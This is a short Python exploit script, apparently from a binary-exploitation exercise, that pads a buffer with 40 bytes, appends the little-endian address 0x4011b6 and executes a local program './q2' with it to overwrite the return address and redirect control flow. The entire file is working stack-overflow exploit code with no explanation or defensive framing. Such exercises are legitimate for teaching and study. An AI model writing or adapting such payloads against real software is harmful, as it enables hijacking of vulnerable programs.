import os
buff = b'x'*40
addr = bytearray.fromhex("4011b6"); 
addr.reverse()
buff += addr
print("exec ./q2 with buff", buff)
os.execv(b'./q2', [b'./q2', buff])